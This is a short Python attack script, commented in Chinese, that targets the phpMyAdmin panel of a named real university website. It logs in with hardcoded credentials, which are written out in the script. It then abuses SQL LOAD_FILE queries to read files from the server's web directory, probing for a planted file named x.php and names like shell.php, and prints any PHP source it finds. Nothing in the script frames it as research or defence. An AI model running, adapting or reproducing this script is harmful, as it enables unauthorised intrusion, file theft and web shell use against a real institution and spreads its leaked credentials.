#!/usr/bin/env python3
import requests
import re
import urllib3
from html import unescape
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)

# 获取token
token_match = re.search(r'token=([a-f0-9]+)', resp.text)
if not token_match:
    print("[-] 获取token失败")
    exit(1)
token = token_match.group(1)

file_path = "/var/www/html/banpot/scmeeting/x.php"

print(f"[*] 检查文件: {file_path}")

# 方法1: 使用LOAD_FILE读取
sql_data = {"sql_query": f"SELECT LOAD_FILE('{file_path}');", "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)

# 检查响应中是否有NULL或错误
if "NULL" in resp.text or "Access denied" in resp.text:
    print("[-] 文件可能不存在或无法读取")
    
    # 尝试列出目录
    print("[*] 尝试列出目录内容...")
    sql_data = {"sql_query": "SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/');", "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
    
    # 尝试读取目录下的其他文件
    print("[*] 尝试读取目录下的其他文件...")
    for fname in ["index.php", "x.php", "test.php", "shell.php"]:
        test_path = f"/var/www/html/banpot/scmeeting/{fname}"
        sql_data = {"sql_query": f"SELECT LOAD_FILE('{test_path}');", "db": "mysql"}
        resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)
        
        # 提取内容
        content_match = re.search(r'<td[^>]*class="value"[^>]*>(.*?)</td>', resp.text, re.DOTALL)
        if content_match and "NULL" not in content_match.group(1):
            content = unescape(content_match.group(1))
            content = re.sub(r'<[^>]+>', '', content).strip()
            if content and len(content) > 10:
                print(f"\n[+] 找到文件: {test_path}")
                print("=" * 60)
                print(content[:2000])
                print("=" * 60)
                break
else:
    # 提取文件内容
    content_match = re.search(r'<td[^>]*class="value"[^>]*>(.*?)</td>', resp.text, re.DOTALL)
    if content_match:
        content = unescape(content_match.group(1))
        content = re.sub(r'<[^>]+>', '', content).strip()
        if content and content != "NULL":
            print("\n[+] 文件内容:")
            print("=" * 60)
            print(content)
            print("=" * 60)
        else:
            print("[-] 文件内容为空或NULL")
    else:
        # 尝试从整个响应中提取
        if "<?php" in resp.text or "<?=" in resp.text:
            php_content = re.search(r'(&lt;\?php.*?&gt;|&lt;\?.*?&gt;)', resp.text, re.DOTALL)
            if php_content:
                print("\n[+] 提取到PHP代码:")
                print(unescape(php_content.group(1)))
